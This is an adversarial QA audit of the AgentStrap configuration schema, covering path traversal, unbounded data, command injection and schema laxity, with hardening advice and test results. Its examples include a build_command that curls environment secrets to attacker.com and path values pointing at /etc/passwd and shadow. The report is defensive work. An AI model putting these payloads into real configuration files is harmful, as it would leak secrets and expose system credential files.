# Adversarial QA Pass: AgentStrap Core Configuration Schema (`templates/config.schema.json`)

**Date**: February 2025
**Auditor**: Adversarial QA Engineer
**Target File**: `templates/config.schema.json`
**Test Suite**: `tests/test_config_schema.py`

---

## Executive Summary

An adversarial Quality Assurance pass was performed on the AgentStrap core configuration schema (`templates/config.schema.json`). The schema governs project-level configuration (`.agentstrap/config.json`) read by session lifecycle hooks (`session-start.sh`, `on-stop.sh`, `session-end.sh`) and core slash commands (`/agentstrap:release`, `/agentstrap:audit`, `/agentstrap:security-audit`, `/agentstrap:handoff`).

While the schema successfully enforces basic data types (string vs object vs boolean) and top-level required properties (`version`, `continuity`), it contains **significant validation gaps, path traversal vectors, unbounded structure vulnerabilities, and missing constraints**.

Because hook bash scripts (`continuity-lib.sh`) and Python helper scripts consume these values directly (e.g., executing path resolution and reading `release.version_files`), weak schema definitions expose the system to unexpected edge cases, injection vectors, and denial-of-service/resource exhaustion risks.

---

## Vulnerability & Severity Matrix

| ID | Issue Category | Description | Impact | Severity |
|---|---|---|---|---|
| **VULN-01** | Path Traversal | Unconstrained path strings (`vault_path`, `handoff_file`, `delta_file`, `artifact_dir`) | Enables reading/manipulating arbitrary files outside project directory via path traversal (`../../`) | **High (P1)** |
| **VULN-02** | Unbounded Data | Missing `maxItems`, `maxLength`, and `uniqueItems` constraints | ReDoS, memory exhaustion, or file descriptor saturation via oversized payloads | **Medium (P2)** |
| **VULN-03** | Injection Risk | Unconstrained shell command strings (`build_command`, `test_command`) | Command injection risk if invoked directly without safe execution wrappers | **Medium (P2)** |
| **VULN-04** | Schema Laxity | Missing `additionalProperties: false` across all objects | Arbitrary unknown key injection, potential config pollution or bypass | **Medium (P2)** |
| **VULN-05** | Missing Enums / Validation | `project.type` and `release.version_files[].field` lack enums/patterns | Invalid configuration passed to skills and release scripts | **Low (P3)** |
| **VULN-06** | Type Permissiveness | Permissive string constraints (`minLength: 1` omitted) | Empty string values (`""`) pass schema validation, causing hook failures | **Low (P3)** |

---

## Detailed Adversarial QA Findings

### 1. Path Traversal Risks (`vault_path`, `handoff_file`, `delta_file`, `artifact_dir`)

* **Target Properties**:
  * `continuity.vault_path`
  * `continuity.handoff_file`
  * `continuity.delta_file`
  * `release.artifact_dir`
  * `release.version_files[].path`
* **Finding**:
  The schema defines these properties as generic `{"type": "string"}` without any pattern restrictions or relative path guarantees.
* **Adversarial Vector**:
  An attacker or corrupted config file can set:
  ```json
  "continuity": {
    "vault_path": "/etc",
    "handoff_file": "../passwd",
    "delta_file": "../shadow"
  }
  ```
* **Impact**:
  When `as_resolve_paths` in `scripts/continuity-lib.sh` resolves `AS_HANDOFF="$AS_VAULT/$AS_HANDOFF_REL"`, it can target arbitrary system files outside the workspace root, risking sensitive file disclosure or unexpected file creation/git staging.
* **Recommendation**:
  Restrict relative file paths with regex patterns (e.g. prohibiting `..` traversal sequences or leading `/`) or require specific path formats:
  ```json
  "pattern": "^(?!.*\\.\\.)[^/].*$"
  ```

---

### 2. Unbounded Data Structures & DoS Risk

* **Target Properties**:
  * `release.version_files` (Array)
  * String lengths across all fields (`version`, `project.name`, etc.)
* **Finding**:
  * `release.version_files` is defined as `{"type": "array", "items": {...}}` with no `maxItems` or `uniqueItems` constraints.
  * No string properties define `maxLength` or `minLength`.
* **Adversarial Vector**:
  A payload containing 1,000,000 array elements or multi-megabyte strings in `project.name` passes schema validation.
* **Impact**:
  Script loops (e.g., release process iterating over `version_files`) will stall, consume excessive memory, or hit disk/CPU exhaustion.
* **Recommendation**:
  Add upper bounds to array sizes and string lengths:
  ```json
  "version_files": {
    "type": "array",
    "maxItems": 50,
    "uniqueItems": true,
    ...
  }
  ```

---

### 3. Command & Tag Injection via Permissive Strings

* **Target Properties**:
  * `release.build_command`
  * `release.test_command`
  * `release.version_files[].field`
* **Finding**:
  `build_command` and `test_command` allow arbitrary string inputs including newline characters, command separators (`&&`, `;`, `|`), and shell subcommands (`$(...)`).
* **Adversarial Vector**:
  ```json
  "release": {
    "build_command": "npm run build && curl -s http://attacker.com/steal?data=$(env | base64)"
  }
  ```
* **Impact**:
  While release commands are intended to run shell scripts, unconstrained strings allow hidden malicious payloads in committed config files to execute during release cycles.
* **Recommendation**:
  If subshell execution is required, document execution sandboxing; otherwise, enforce `maxLength` and sanitize inputs before shell execution.

---

### 4. Permissive Schema Laxity (`additionalProperties`)

* **Target Properties**:
  * Root schema object
  * `project`, `continuity`, `release`, `audit`, and `release.version_files[]` object structures
* **Finding**:
  None of the object definitions specify `"additionalProperties": false`.
* **Adversarial Vector**:
  Arbitrary unverified properties can be injected into any level of the configuration:
  ```json
  {
    "version": "2.0.0",
    "continuity": {
      "vault_path": ".",
      "handoff_file": "HANDOFF.md",
      "delta_file": "DELTA_TRACKING.md",
      "malicious_override": true
    },
    "injected_payload": { "cmd": "exec" }
  }
  ```
* **Impact**:
  Unknown properties pass validation silently. Forward/backward compatibility logic or loose Python `dict` inspection could accidentally consume unintended keys.
* **Recommendation**:
  Add `"additionalProperties": false` to rigid schemas, or explicitly define `"patternProperties"` for allowed extension points.

---

### 5. Permissive String Typings & Missing Enums

* **Target Properties**:
  * `version`: Allows empty string `""` or non-semver strings like `"invalid-version-string"`.
  * `project.stage`: Has `enum: ["planning", "code"]`, but `project.type` is free-form string.
  * `audit.deployment_context`: Has `enum: ["air-gapped", "internal", "internet-facing"]`.
* **Finding**:
  Empty strings (`""`) pass validation for `version`, `vault_path`, `handoff_file`, `delta_file`, `build_command`, `test_command`, `path`, and `field`.
* **Adversarial Vector**:
  ```json
  "continuity": {
    "vault_path": "",
    "handoff_file": "",
    "delta_file": ""
  }
  ```
* **Impact**:
  Empty string paths cause `scripts/continuity-lib.sh` to resolve relative paths as `$VAULT/`, leading to unexpected target file resolution or directory read failures.
* **Recommendation**:
  Add `"minLength": 1` to all required or non-optional string properties. Enforce Semantic Versioning pattern for `version`:
  ```json
  "version": {
    "type": "string",
    "pattern": "^[0-9]+\\.[0-9]+\\.[0-9]+(-[0-9A-Za-z.-]+)?$"
  }
  ```

---

## Programmatic Verification Test Suite

The programmatic test suite in `tests/test_config_schema.py` asserts all identified edge cases and validation gaps against `templates/config.schema.json`.

### Test Coverage Summary

| Test Case | Description | Result |
|---|---|---|
| `test_valid_minimal_config` | Asserts minimal valid config parses cleanly | **PASS** |
| `test_valid_full_config` | Asserts complete valid config parses cleanly | **PASS** |
| `test_gap_path_traversal_permitted` | Confirms schema currently permits path traversal sequences | **CONFIRMED GAP** |
| `test_gap_unbounded_array_permitted` | Confirms schema permits oversized arrays (1000+ items) | **CONFIRMED GAP** |
| `test_gap_duplicate_version_files_permitted` | Confirms schema permits duplicate version file items | **CONFIRMED GAP** |
| `test_gap_additional_properties_permitted` | Confirms schema permits arbitrary top/nested level keys | **CONFIRMED GAP** |
| `test_gap_empty_strings_permitted` | Confirms schema permits empty strings in required fields | **CONFIRMED GAP** |
| `test_gap_command_injection_strings_permitted` | Confirms schema permits arbitrary subshell commands | **CONFIRMED GAP** |
| `test_rejection_missing_required_version` | Rejects config missing `version` | **PASS** |
| `test_rejection_missing_required_continuity` | Rejects config missing `continuity` | **PASS** |
| `test_rejection_missing_continuity_fields` | Rejects `continuity` missing `vault_path`/`handoff_file` | **PASS** |
| `test_rejection_invalid_enum_project_stage` | Rejects invalid `project.stage` enum values | **PASS** |
| `test_rejection_invalid_enum_audit_deployment_context` | Rejects invalid `audit.deployment_context` values | **PASS** |
| `test_rejection_invalid_types` | Rejects wrong data types (int for string, str for bool, etc.) | **PASS** |

Execution command:
```bash
python3 -m unittest tests/test_config_schema.py
```

---

## Hardening Recommendations

1. **Path Traversal Shield**:
   Add `pattern` constraints to `vault_path`, `handoff_file`, `delta_file`, and `artifact_dir` to prevent path traversal.
2. **String Length & Format Constraints**:
   Add `minLength: 1` and `maxLength: 1024` for string properties. Apply SemVer pattern for `version`.
3. **Array Bounding**:
   Set `maxItems: 50` and `uniqueItems: true` on `release.version_files`.
4. **Strict Schema Constraints**:
   Add `additionalProperties: false` across root and nested object definitions to prevent unvalidated property injection.
